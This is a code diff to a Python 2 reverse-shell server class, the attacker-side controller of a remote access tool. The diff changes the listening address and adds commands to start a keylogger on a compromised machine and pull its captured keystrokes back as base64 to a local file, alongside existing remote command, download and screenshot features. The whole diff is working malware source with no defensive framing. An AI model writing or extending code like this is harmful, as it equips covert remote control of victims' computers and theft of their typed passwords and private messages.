@@ -4,7 +4,9 @@ import json
 import base64
 import time
 
-
+#-----------------------------------------------------------------------------------------------------------------
+#  class reverse_shell_server
+#-----------------------------------------------------------------------------------------------------------------
 class reverse_shell_server:
     target     = None
     target_ip  = None
@@ -12,15 +14,27 @@ class reverse_shell_server:
     prompt     = None
 
     def get_cmd_arg(self,command):
+        '''
+            this method is used to retrive the argumentss from
+            the typed command (if any arguments are mentioned)
+        '''
         cmd_arg_list = command.split(" ")
         command      = cmd_arg_list[0]
         arguments    = cmd_arg_list[1:]
         return command,arguments
 
     def reliable_send(self, data):
+        '''
+            used to send data 
+        '''    
         self.target.send(json.dumps(data))
     
     def reliable_recv(self):
+        '''
+            this method is used for receiving large chunks of
+            data even if the data is greater than the receive
+            buffer size
+        '''
         recv_data = ""
         while True:
             try:
@@ -30,10 +44,14 @@ class reverse_shell_server:
                 continue
 
     def establish_connection(self):
+        '''
+            this method establishes connection with the 
+            reverse shell.
+        '''
         print "connecting to shell ... "
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(("192.168.2.10", 54321))
+        sock.bind(("192.168.2.9", 54321))
         sock.listen(5)
         target,ip = sock.accept()
         print "connection established starting shell ..."
@@ -53,6 +71,16 @@ class reverse_shell_server:
             self.reliable_send(command + " " + arguments[0])
             print prompt+self.reliable_recv()
     
+    def keylogger_dump(self,command):
+        self.reliable_send(command)
+        dnloaded_data = self.reliable_recv()
+        if dnloaded_data[:7] == "[error]":
+            print self.prompt+dnloaded_data
+        else:
+            with open("recv_keylog.txt", "wb") as downloaded_file:
+                    downloaded_file.write(base64.b64decode(dnloaded_data))
+                    print self.prompt+" [!] keylog received"
+
     def download(self, command):
         prompt            = self.prompt
         command,arguments = self.get_cmd_arg(command)
@@ -160,6 +188,12 @@ class reverse_shell_server:
             elif command[:10] == "screenshot":
                 self.screenshot(command)
             
+            elif len(command) == 15 and command[:15] == "keylogger_start":
+                self.reliable_send(command)
+            
+            elif len(command) == 14 and command[:14] == "keylogger_dump":
+                self.keylogger_dump(command)
+
             else:
                 self.reliable_send(command)
                 output = self.reliable_recv()
